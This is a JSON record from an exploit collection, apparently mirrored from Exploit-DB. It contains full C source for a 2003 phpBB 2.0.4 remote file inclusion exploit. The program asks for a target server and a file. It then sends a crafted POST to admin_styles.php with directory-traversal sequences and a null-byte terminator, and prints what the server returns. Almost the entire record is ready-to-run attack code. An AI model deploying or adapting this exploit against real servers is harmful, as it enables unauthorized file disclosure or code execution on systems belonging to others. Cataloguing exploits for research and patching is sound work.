{
  "id": "47",
  "title": "phpBB 2.0.4 - PHP Remote File Inclusion",
  "cve": null,
  "vuln_type": "unknown",
  "code": "/***********************************************************/\r\n/* phpBB 2.0.4 Remote Admin_Styles.PHP Theme_Info.CFG File Include  */\r\n/*                                                                                                    */\r\n/*                Exploit made on June 2003 by Spoofed Existence               */\r\n/*                                                                                                    */\r\n/*       Patch : http://www.phpbb.com/phpBB/viewtopic.php?t=113826      */\r\n/***********************************************************/\r\n\r\n#include <stdio.h>\r\n#include <sys/types.h>\r\n#include <sys/socket.h>\r\n#include <netinet/in.h>\r\n#include <netdb.h>\r\n\r\nint main()\r\n{\r\n //The socket stuff\r\n struct hostent *hp;\r\n struct sockaddr_in sa;\r\n int sock;\r\n\r\n //The input stuff\r\n char server[100];\r\n char location[100];\r\n char sfile[100];\r\n int escapes;\r\n char* file;\r\n\r\n //The request stuff\r\n char* request;\r\n char* postdata;\r\n char* header;\r\n\r\n //The buffer to store the response\r\n char buffer[4096];\r\n int tworeturns = 0;\r\n int showing = 0;\r\n\r\n //Other\r\n int i;\r\n\r\n //Ask the server\r\n printf(\"Server: \");\r\n scanf(\"%100s\", server);\r\n printf(\"Forum location: \");\r\n scanf(\"%100s\", location);\r\n printf(\"Directories to escape: \");\r\n scanf(\"%i\", &escapes);\r\n printf(\"File to get/execute: \");\r\n scanf(\"%100s\", sfile);\r\n\r\n\r\n //Start the exploit!\r\n printf(\"\\n\\nStarting the exploit...\\n\");\r\n\r\n //Connect to the server\r\n printf(\"Creating socket... \");\r\n if((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)\r\n {\r\n  printf(\"Failed!\\n\");\r\n  return 0;\r\n } else{ printf(\"Done!\\n\");\r\n }\r\n\r\n\r\n printf(\"Looking up server IP... \");\r\n if((hp = gethostbyname((char*)server)) == NULL)\r\n {\r\n  printf(\"Failed!\\n\");\r\n  return 0;\r\n } else { printf(\"Done!\\n\");\r\n }\r\n\r\n\r\n printf(\"Connecting %s:80... \", server);\r\n memcpy(&sa.sin_addr, hp->h_addr_list[0], hp->h_length);\r\n sa.sin_family = AF_INET;\r\n sa.sin_port = htons(80);\r\n if(connect(sock, (struct sockaddr*)&sa, sizeof(sa)))\r\n {\r\n  printf(\"Failed!\\n\");\r\n  return 0;\r\n } else { printf(\"Done!\\n\");\r\n }\r\n\r\n\r\n //Create the request\r\n printf(\"Building request... \");\r\n\r\n //Create the postdata\r\n file = (char*)malloc(sizeof(char) * (escapes * 3 + strlen(sfile) + 1));\r\n\r\n while(escapes > 0)\r\n {\r\n  if(escapes == 1)\r\n  {\r\n   sprintf(file, \"%s%s%s\", file, \"..\", sfile);\r\n  } else { sprintf(file, \"%s%s\", file, \"../\");\r\n  }\r\n\r\n  escapes --;\r\n }\r\n\r\n postdata = (char*)malloc((27 + strlen(file)) * sizeof(char));\r\n sprintf(postdata, \"send_file= &install_to=%s%s00\", file, \"%\");\r\n\r\n header = (char*)malloc((170 + strlen(server) + strlen(location)) *\r\nsizeof(char));\r\n sprintf(header, \"POST /%s/admin/admin_styles.php?mode=addnew\r\nHTTP/1.1\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nHost:\r\n%s\\r\\nContent-Length: %i\\r\\nConnection: close\\r\\n\\r\\n\", location, server,\r\nstrlen(postdata));\r\n\r\n request = (char*)malloc((strlen(postdata) + strlen(header) + 1) *\r\nsizeof(char));\r\n sprintf(request, \"%s%s\", header, postdata);\r\n\r\n printf(\"Done!\\n\");\r\n\r\n\r\n //Send the request\r\n printf(\"Sending request... \");\r\n write(sock, request, strlen(request));\r\n printf(\"Done!\\n\");\r\n\r\n printf(\"\\nResponse:\\n\");\r\n //Get the response\r\n while(recv(sock, buffer, 4096, 0) != 0)\r\n {\r\n  for(i = 0; i < strlen(buffer); i++)\r\n  {\r\n   //Only show the character when it should\r\n   if(showing == 1)\r\n   {\r\n    printf(\"%c\", buffer[ i ]);\r\n   }\r\n\r\n\r\n   //Stop showing from \\n<br>\\n\r\n   if(buffer[ i ] == '\\n' && buffer[i + 1] == '<' && buffer[i + 2] == 'b' &&\r\nbuffer[i + 3] == 'r' && buffer[i + 4] == '>' && buffer[i + 5] == '\\n' &&\r\nshowing == 1)\r\n   {\r\n    showing = 0;\r\n    tworeturns = 0;\r\n   }\r\n   //Or from \\n<br />\\n\r\n   if(buffer[ i ] == '\\n' && buffer[i + 1] == '<' && buffer[i + 2] == 'b' &&\r\nbuffer[i + 3] == 'r' && buffer[i + 4] == ' ' && buffer[i + 5] == '/' &&\r\nbuffer[i + 6] == '>' && buffer[i + 7] == '\\n' && showing == 1)\r\n   {\r\n    showing = 0;\r\n    tworeturns = 0;\r\n   }\r\n\r\n   //If there's a return and tworeturns = true, start showing it\r\n   if(buffer[ i ] == '\\n' && tworeturns == 1)\r\n   {\r\n    showing = 1;\r\n   }\r\n\r\n   //If there are two returns, set tworeturns to true and add 3 to i\r\n   if(buffer[ i ] == '\\r' && buffer[i + 1] == '\\n' && buffer[i + 2] == '\\r'\r\n&& buffer[i + 3] == '\\n')\r\n   {\r\n    tworeturns = 1;\r\n    i += 3;\r\n   }\r\n  }\r\n }\r\n printf(\"\\n\");\r\n\r\n return 0;\r\n}\r\n\r\n// milw0rm.com [2003-06-30]",
  "url": "https://www.exploit-db.com/exploits/47"
}